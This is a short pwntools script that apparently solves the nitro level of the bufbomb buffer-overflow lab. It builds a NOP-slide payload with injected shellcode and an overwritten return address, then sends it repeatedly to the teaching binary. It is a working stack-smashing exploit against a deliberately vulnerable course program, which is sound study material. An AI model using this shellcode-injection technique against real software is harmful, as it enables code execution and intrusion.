from pwn import *

with open('./ID', 'r') as f:
    id = f.read().splitlines()[0]

sh = process(['./bufbomb', '-u', id, '-n'])

length = 512
ebp = 0x556834a0
ret = 0x08048e15
cookie = 0x274adc8a
distance = 0x28 # distance from esp to previous ebp
nop = chr(0x90)

shellcode = asm('mov eax, {}; lea ebp, [esp + {}]; push {}; ret;'.format(cookie, distance, ret))

exploit = flat([shellcode.rjust(length + 8, nop), 0xdeadbeef, ebp - length / 2]) # NOP slide

with open('./nitro_{}.txt'.format(id), 'w') as f:
    f.write(' '.join(char.encode('hex') for char in exploit))

for _ in range(5):
    sh.sendline(exploit)
    print sh.recv()

sh.interactive()